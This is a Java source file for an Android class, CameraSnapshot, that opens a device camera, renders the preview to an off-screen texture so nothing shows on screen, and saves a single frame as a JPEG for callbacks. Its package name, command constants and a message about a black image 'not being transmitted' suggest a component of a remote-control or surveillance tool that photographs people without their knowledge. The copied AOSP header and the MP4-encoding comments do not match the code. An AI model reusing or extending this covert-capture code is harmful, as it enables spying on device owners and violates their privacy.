/*
 * Copyright 2013 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.lfish.control.action.actiontool;
		import android.annotation.TargetApi;
		import android.graphics.ImageFormat;
		import android.graphics.Rect;
		import android.graphics.SurfaceTexture;
		import android.graphics.YuvImage;
		import android.hardware.Camera;
		import android.opengl.GLES20;
		import android.os.Build;
		import android.util.Log;

		import com.lfish.control.ControlApplication;

		import java.io.ByteArrayOutputStream;
		import java.io.File;
		import java.io.OutputStream;
		import java.util.ArrayList;
		import java.util.Hashtable;
		import java.util.List;

public class CameraSnapshot {
	private static final String TAG = "CameraSnapshot";
	public static final int CAMERA_ANY = -1;
	private Object cameraLock = new Object();
	private static CameraSnapshot singleton = null;
	private Hashtable<Integer, Boolean> enable = new Hashtable<Integer, Boolean>();
	private Camera.ErrorCallback errorCallback = new Camera.ErrorCallback() {
		@Override
		public void onError(int error, Camera camera) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (onError), Error: " + error );
			}

			if(error == Camera.CAMERA_ERROR_SERVER_DIED){
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onError), Error: CAMERA_ERROR_SERVER_DIED" );
				}
			}else if(error == Camera.CAMERA_ERROR_UNKNOWN){
				if (Cfg.DEBUG) {
					Check.log(TAG + " (onError), Error: CAMERA_ERROR_UNKNOWN" );
				}
			}

		}
	};

	public static CameraSnapshot self(){
		if(singleton==null){
			singleton = new CameraSnapshot();
		}
		return singleton;
	}


	private CameraSnapshot(){

	}

	// camera state
	//private Camera mCamera;
	private SurfaceTexture surface;
	private Camera.PreviewCallback previewCallback = new Camera.PreviewCallback() {
		@Override
		public void onPreviewFrame(byte[] bytes, Camera camera) {

			class CCD implements Runnable {
				byte[] bytes;

				Camera.Parameters cameraParms;
				Camera.Size size;
				CCD(byte[] b, Camera c) {
					bytes= b;
					cameraParms = c.getParameters();
					size = cameraParms.getPreviewSize();
				}

				public void run() {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (CCD), size: " + bytes.length);
					}

					try {
						if (isBlack(bytes)) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " (CCD),  BLACK");
								for(CameraSnapCallBack callBack:cameraSnapCallBacks){
									callBack.onFailed("手机后置摄像头紧贴桌面~黑图一张，不传输。");
								}
							}
							return;
						}

						int format = cameraParms.getPreviewFormat();
						if (format == ImageFormat.NV21) {
							ByteArrayOutputStream jpeg = new ByteArrayOutputStream();
							YuvImage image = new YuvImage(bytes, ImageFormat.NV21, size.width, size.height, null);
							image.compressToJpeg(new Rect(0, 0, image.getWidth(), image.getHeight()), 100, ((OutputStream)
									jpeg));

							String	FileName = CmdUtils.GetFileName(ControlApplication.context, CommonDefine.COT_SNAPSHOT, "jpg");
							String Path = Utils.SDPATH + Utils.DIR + File.separator+FileName;

							FileUtils.writeFile(jpeg.toByteArray(),Path);
//							Core.self().executeAction(Path,CommonDefine.COT_SCREEN);
//							ModuleCamera.callback(jpeg.toByteArray());

							for(CameraSnapCallBack callBack:cameraSnapCallBacks){
								callBack.onSuccess(Path);
							}

							cameraSnapCallBacks.clear();

							Log.i("Tag", Path);
						}
					}catch(Exception e){
						if (Cfg.DEBUG) {
							Check.log(TAG + " (CCD), error decoding frame: " + bytes.length);
						}
					}
					finally {

					}
				}
			}

			boolean released=false;
			try {
				if(bytes!=null ) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (onPreviewFrame), size: " + bytes.length);
					}
					// start another Thread to check exploit thread end
					CCD decodeCameraFrame = new CCD(bytes, camera);
					released = releaseCamera(camera);
					Thread ec = new Thread(decodeCameraFrame);
					ec.start();
				}
			}finally {
				try {
					if(!released)
						releaseCamera(camera);
				}catch(Exception e){
					if (Cfg.DEBUG) {
						Check.log(TAG + " (onPreviewFrame) probably release called twice: " + e);
					}
				}
				synchronized (cameraLock) {
					cameraLock.notifyAll();
				}
			}
		}
	};


	public interface CameraSnapCallBack{
		public void onSuccess(String path);
		public void onFailed(String msg);
	}

	private List<CameraSnapCallBack> cameraSnapCallBacks = new ArrayList<CameraSnapCallBack>();

	/**
	 * Wraps encodeCameraToMpeg().  This is necessary because SurfaceTexture will try to use
	 * the looper in the current thread if one exists, and the CTS tests create one on the
	 * test thread.
	 * <p/>
	 * The wrapper propagates exceptions thrown by the worker thread back to the caller.
	 * <p/>
	 * /**
	 * Tests encoding of AVC video from Camera input.  The output is saved as an MP4 file.
	 * @param cameraId
	 */
	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
	public void snapshot(int cameraId,CameraSnapCallBack cameraSnapCallBack) {

		cameraSnapCallBacks.add(cameraSnapCallBack);
		// arbitrary but popular values
		final int encWidth = 768; //1024;
		final int encHeight = 432; //768;

		//if(Status.self().startedSeconds() < 30){
		//	return;
		//}
		//768x432
		if(enable.containsKey(cameraId) && !enable.get(cameraId)){
			return;
		}
		Camera camera = null;

		synchronized (cameraLock) {
			try {
				camera = prepareCamera(cameraId, encWidth, encHeight);
				if (camera == null) {
					//todo: reenable disabling getting camera in case of error if needed: this.enable.put(cameraId, false);
					return;
				}
				if (Cfg.DEBUG) {
					Check.log(TAG + " (snapshot), cameraId: " + cameraId);
				}

				if(this.surface == null){
					int[] surfaceparams = new int[1];
					GLES20.glGenTextures(1, surfaceparams, 0);

					GLES20.glBindTexture(GLES20.GL_TEXTURE_2D, surfaceparams[0]);
					GLES20.glTexParameteri(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_WRAP_S,
							GLES20.GL_CLAMP_TO_EDGE);
					GLES20.glTexParameteri(GLES20.GL_TEXTURE_2D, GLES20.GL_TEXTURE_WRAP_T,
							GLES20.GL_CLAMP_TO_EDGE);

					this.surface = new SurfaceTexture(surfaceparams[0]);
				}

				//camera.autoFocus(this.autofocusCallback);
				camera.setPreviewTexture(surface);
				camera.startPreview();
				//byte[] buffer = new byte[]{};
				//camera.addCallbackBuffer(buffer);
				//camera.setPreviewCallbackWithBuffer(previewCallback);
				camera.setOneShotPreviewCallback(previewCallback);
				cameraLock.wait();
			} catch (Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (snapshot) ERROR: " + e);
				}
			}
		}
	}

	@TargetApi(Build.VERSION_CODES.GINGERBREAD)
	private Camera openCamera(int requestFace) {
		Camera cam = null;
		Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
		int cameraCount = Camera.getNumberOfCameras();
		for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
			Camera.getCameraInfo(camIdx, cameraInfo);

			if(cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT){
				if (Cfg.DEBUG) {
					Check.log(TAG + " (openCamera), found FACE CAMERA");
				}
				//continue;
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " (openCamera), orientation: " +  cameraInfo.orientation);
			}
			if (requestFace == cameraInfo.facing || requestFace == CAMERA_ANY) {
				try {

					if(requestFace == CAMERA_ANY){
						cam = Camera.open();
					}else {
						cam = Camera.open(camIdx);
					}

					if(cam!=null) {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (openCamera), opened: " + camIdx);
						}

						return cam;
					}
				} catch (RuntimeException e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (openCamera), Error: " + e);
					}
				}
			}
		}

		return cam;
	}

	/**
	 * Configures Camera for video capture.  Sets mCamera.
	 * <p/>
	 * Opens a Camera and sets parameters.  Does not start preview.
	 */
	private Camera prepareCamera(int cameraId, int encWidth, int encHeight) {
		try {

			Camera camera = openCamera(cameraId);
			if(camera == null){
				if (Cfg.DEBUG) {
					Check.log(TAG + " (prepareCamera), cannot open camera: " + cameraId);
				}
				return null;
			}
			if (Cfg.DEBUG) {
				camera.setErrorCallback(this.errorCallback);
			}

			Camera.Parameters cameraParms = camera.getParameters();
			List<String> modes = cameraParms.getSupportedFocusModes();
			if(modes.contains("continuous-picture")) {
				cameraParms.setFocusMode("continuous-picture");
			}
			if(cameraParms.getSupportedPreviewFormats().contains(ImageFormat.NV21)) {
				cameraParms.setPreviewFormat(ImageFormat.NV21);
			}
			//cameraParms.set("iso", (String) "400");

			choosePreviewSize(cameraParms, encWidth, encHeight);
			// leave the frame rate set to default
			camera.setParameters(cameraParms);

			Camera.Size size = cameraParms.getPreviewSize();

			if (Cfg.DEBUG) {
				Check.log(TAG + " (prepareCamera), Camera preview size is " + size.width + "x" + size.height);
			}

			return camera;
		} catch (Exception ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (prepareCamera), ERROR " + ex);
			}
			return null;
		}
	}

	/**
	 * Attempts to find a preview size that matches the provided width and height (which
	 * specify the dimensions of the encoded video).  If it fails to find a match it just
	 * uses the default preview size.
	 * <p/>
	 * TODO: should do a best-fit match.
	 */
	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
	private static void choosePreviewSize(Camera.Parameters parms, int width, int height) {
		//Camera.Size ppsfv = parms.getPreferredPreviewSizeForVideo();

		List<Camera.Size> previews = parms.getSupportedPreviewSizes();
		for (Camera.Size size : previews) {
			if (size.width == width && size.height == height) {
				parms.setPreviewSize(width, height);
				if (Cfg.DEBUG) {
					Check.log(TAG + " (choosePreviewSize), found best preview size!");
				}
				return;
			}
		}

		Camera.Size best = getBestPreviewSize(parms, width, height);
		if (best != null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (choosePreviewSize), Camera best preview size for video is " +
						best.width + "x" + best.height);
			}
		}

		if (best != null) {
			Log.w(TAG, "Unable to set preview size to " + width + "x" + height);
			parms.setPreviewSize(best.width, best.height);
		}
	}

//	@TargetApi(Build.VERSION_CODES.HONEYCOMB)
//	public static void setCameraDisplayOrientation(int cameraId, android.hardware.Camera camera) {
//		try {
//			android.hardware.Camera.CameraInfo info =
//					new Camera.CameraInfo();
//			android.hardware.Camera.getCameraInfo(cameraId, info);
//
//			int rotation = Status.getAppGui().getWindowManager().getDefaultDisplay()
//					.getRotation();
//			int degrees = 0;
//			Log.d(TAG, "rotation:" + rotation);
//			switch (rotation) {
//				case Surface.ROTATION_0:
//					degrees = 0;
//					break;
//				case Surface.ROTATION_90:
//					degrees = 90;
//					break;
//				case Surface.ROTATION_180:
//					degrees = 180;
//					break;
//				case Surface.ROTATION_270:
//					degrees = 270;
//					break;
//			}
//
//			int result;
//			if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
//				result = (info.orientation + degrees) % 360;
//				result = (360 - result) % 360;  // compensate the mirror
//			} else {  // back-facing
//				result = (info.orientation - degrees + 360) % 360;
//			}
//			if (Cfg.DEBUG) {
//				Check.log(TAG + " (setCameraDisplayOrientation), " + degrees);
//			}
//			if(result != 0) {
//				camera.setDisplayOrientation(result);
//			}
//		}catch(Exception ex){
//			if (Cfg.DEBUG) {
//				Check.log(TAG + " (setCameraDisplayOrientation), ERROR: " + ex);
//			}
//		}
//	}

	private static Camera.Size getBestPreviewSize(Camera.Parameters parameters, int width, int height){
		Camera.Size bestSize = null;
		List<Camera.Size> sizeList = parameters.getSupportedPreviewSizes();

		int maxSize = width * height;
		bestSize = null;

		for(int i = 1; i < sizeList.size(); i++){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getBestPreviewSize), supported size: " + sizeList.get(i).width + " x " +sizeList.get(i).height);
			}
			int area = sizeList.get(i).width * sizeList.get(i).height;
			int areaBest = (bestSize!=null? (bestSize.width * bestSize.height) : 0);
			if(area > areaBest && area < maxSize){
				bestSize = sizeList.get(i);
			}
		}

		return bestSize;
	}


	private boolean isBlack(byte[] raw) {
		for (int i = 0; i < raw.length; i++) {
			if (raw[i] > 20) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (isBlack), it's not black: " + raw[i]);
				}
				return false;
			}
		}
		return true;
	}


	/**
	 * Stops camera preview, and releases the camera to the system.
	 */
	private synchronized boolean releaseCamera(Camera camera) {
		if (camera != null) {
			/*try {
				camera.reconnect();
			} catch (IOException e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (releaseCamera), ERROR: " + e);
				}
			}*/
			camera.stopPreview();
			camera.release();
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (releaseCamera), released");
		}
		return  true;
	}

}

